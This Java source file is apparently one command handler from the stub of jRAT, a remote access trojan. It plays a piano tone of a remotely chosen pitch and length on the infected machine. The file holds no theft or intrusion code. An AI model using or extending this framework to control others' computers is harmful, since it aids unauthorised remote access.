package pro.jrat.stub.packets.incoming;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.SourceDataLine;

import pro.jrat.stub.Connection;
import pro.jrat.stub.Note;

public class Packet67LongPianoNote extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int tone = Connection.readInt();
		int time = Connection.readInt();
		AudioFormat af = new AudioFormat(Note.SAMPLE_RATE, 8, 1, true, true);
		SourceDataLine dl = AudioSystem.getSourceDataLine(af);
		dl.open(af, Note.SAMPLE_RATE);
		dl.start();
		Note.play(dl, Note.values()[tone], time * 1000);
		dl.drain();
		dl.close();
	}

}
